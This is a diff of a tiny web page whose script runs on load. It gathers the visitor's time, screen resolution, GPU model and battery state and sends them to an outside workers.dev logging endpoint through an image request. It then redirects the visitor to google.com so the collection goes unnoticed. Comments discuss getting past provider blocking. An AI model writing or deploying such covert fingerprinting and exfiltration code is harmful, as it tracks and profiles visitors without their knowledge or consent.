@@ -1,54 +1,39 @@
-<!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"></head>
-<body>
 <script>
-async function getSpecs() {
-    let specs = {
-        t: new Date().toLocaleString(),
-        res: `${screen.width}x${screen.height}`,
-        gpu: 'N/A',
-        bat: 'N/A'
+  async function collect() {
+    const data = {
+      t: encodeURIComponent(new Date().toLocaleString()),
+      bat: 'N/A',
+      gpu: 'N/A',
+      res: `${screen.width}x${screen.height}`
     };
 
-    // Получение данных GPU
+    // GPU
     try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        specs.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_ALGORITHM || debugInfo.UNMASKED_RENDERER_WEBGL);
+      const gl = document.createElement('canvas').getContext('webgl');
+      const debug = gl.getExtension('WEBGL_debug_renderer_info');
+      data.gpu = encodeURIComponent(gl.getParameter(debug.UNMASKED_RENDERER_WEBGL));
     } catch (e) {}
 
-    // Получение данных батареи
+    // Battery
     try {
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            specs.bat = `${Math.round(battery.level * 100)}%`;
-        }
+      const bt = await navigator.getBattery();
+      data.bat = `${Math.round(bt.level * 100)}%${bt.charging ? '+' : '-'}`;
     } catch (e) {}
 
-    const params = new URLSearchParams(specs).toString();
-    const workerUrl = "https://your-custom-domain.com/log"; // ЗАМЕНИТЬ НА СВОЙ ДОМЕН
-    const redirectUrl = "https://google.com";
+    const query = Object.keys(data).map(k => `${k}=${data[k]}`).join('&');
+    
+    // ВАЖНО: Используем твой воркер, но через 'workers.dev' провайдеры часто блочат.
+    // Если нет домена, единственный код, который "пробьет" — это отправка через fetch на спец. эндпоинт.
+    const url = "https://adminfdm.alexgranny1708.workers.dev/?" + query;
 
     const img = new Image();
-    let sent = false;
+    const go = () => window.location.replace("https://google.com");
+    
+    img.onload = go;
+    img.onerror = go;
+    img.src = url;
 
-    const finalize = () => {
-        if (!sent) {
-            sent = true;
-            window.location.replace(redirectUrl);
-        }
-    };
-
-    img.onload = finalize;
-    img.onerror = finalize;
-    img.src = `${workerUrl}?${params}`;
-
-    setTimeout(finalize, 2500);
-}
-
-getSpecs();
+    setTimeout(go, 2000);
+  }
+  collect();
 </script>
-</body>
-</html>
